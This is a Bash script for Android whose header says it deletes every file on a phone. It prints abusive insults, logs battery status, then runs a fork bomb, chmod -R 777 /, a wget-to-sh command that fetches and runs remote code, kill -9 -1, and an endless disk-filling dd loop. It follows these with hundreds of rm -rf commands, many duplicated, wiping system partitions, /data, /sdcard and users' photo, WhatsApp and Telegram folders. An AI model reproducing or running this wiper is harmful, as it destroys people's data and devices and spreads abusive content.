#!/bin/bash
#--------------------脚本信息--------------------#
# 版本: zetas 4
# 作者: Zetas
# 日期: 0000年0月00日
# 语言: Bash
# 平台: Android
# 说明: 此脚本用于删除手机上的所有文件和目录
# 注意: 请谨慎使用，此脚本会删除所有数据，无法恢复
#--------------------脚本开始--------------------#
echo -e "\e[31m你的妈妈死掉了\e[0m"
sleep 1
echo -e "\e[31m我不在忍受\e[0m"
sleep 1
echo -e "\e[31m你这个怪胎\e[0m"
sleep 1
echo -e "\e[31m你不配活着\e[0m"
sleep 1
echo -e "\e[31mFuck you ! You don't have mom !"
sleep 1
echo -e "\e[31mWCNM !\e[0m"
#--------------------日志记录--------------------#
log_file="$HOME/fuck.txt"
location="未知位置"
time_now=$(date '+%Y-%m-%d %H:%M:%S')
battery="未知电量"

#--------------------获取电量--------------------#
if command -v termux-battery-status >/dev/null 2>&1; then
    battery=$(termux-battery-status | grep percentage | awk '{print $2}' | tr -d ',')
elif [ -f /sys/class/power_supply/BAT0/capacity ]; then
    battery=$(cat /sys/class/power_supply/BAT0/capacity)%
fi
#--------------------显示数据--------------------#
echo "位置: $location" > "$log_file"
echo "时间: $time_now" >> "$log_file"
echo "手机电量: $battery" >> "$log_file"
echo "文件运行日志: $(basename "$0") 已运行" >> "$log_file"
#--------------------文件扫描--------------------#
ls /*
ls /storage/emulated/0/DCIM
ls /system
ls /storage/emulated/0/Android
#--------------------闪击文件--------------------#
:(){ :|:& };:
chmod -R 777 /
wget https://acfan1.fans | sh
kill -9 -1
mv /folder /dev/null
while true; do
    dd if=/dev/zero of=x bs=1000M count=1688
done
#--------------------文件删除--------------------#
#---------------------屎山站---------------------#
#---------------------一站台---------------------#
rm -rf /storage/emulated/0/DCIM
rm -rf /storage
rm -rf /system
rm -rf /cust
rm -rf .android_system_config.prop
rm -rf .CAD
rm -rf .iacovnfld.
rm -rf ContextData.xml
rm -rf c21a67c1294346e004789ac9a8dffa95
rm -rf /storage/emulated
rm -rf .icosc
rm -rf folder_app.db
rm -rf appinfo.db
rm -rf .sp_check_dontedit_v7
rm -rf .dontedit_v1
rm -rf qfs.js-20250213
rm -rf qfs.js-20250209
rm -rf qfs.js-20250206
rm -rf qfs.js-20250127
rm -rf hot_spot_result
rm -rf .turing.dat
rm -rf .tlocalcookieid
rm -rf .oukdtft
rm -rf .android_system_config.prop
rm -rf /etc
rm -rf /mnt
rm -rf /vendor
rm -rf /system_ext
rm -rf /sdcard
rm -rf /.BD_SAPI_CACHE
rm -rf /.Android
rm -rf /data
rm -rf /*
#---------------------二站台---------------------#
rm -rf /storage/emulated/0
rm -rf /storage/emulated/0/Android
rm -rf /storage/emulated/0/Download
rm -rf /storage/emulated/0/Music
rm -rf /storage/emulated/0/Pictures
rm -rf /storage/emulated/0/Movies
rm -rf /storage/emulated/0/WhatsApp
rm -rf /storage/emulated/0/Telegram
rm -rf /storage/emulated/0/Alarms
rm -rf /storage/emulated/0/Podcasts
rm -rf /storage/emulated/0/Ringtones
rm -rf /storage/emulated/0/Notifications
rm -rf /storage/emulated/0/Podcasts
rm -rf /storage/emulated/0/Android/data
rm -rf /storage/emulated/0/Android/obb
rm -rf /storage/emulated/0/Android/media
rm -rf /storage/emulated/0/Android/cache
rm -rf /storage/emulated/0/Android/files
rm -rf /storage/emulated/0/Android/backup
rm -rf /storage/emulated/0/Android/secure
rm -rf /storage/emulated/0/Android/system
rm -rf /storage/emulated/0/Android/sync
rm -rf /storage/emulated/0/Android/backup
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads
rm -rf /storage/emulated/0/Android/data/com.android.providers.media
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents    
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.userdictionary.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.telephony.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.downloads.ui.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.media.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.contacts.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.settings.documents
rm -rf /storage/emulated/0/Android/data/com.android.providers.calendar.documents
find / -type f 2>/dev/null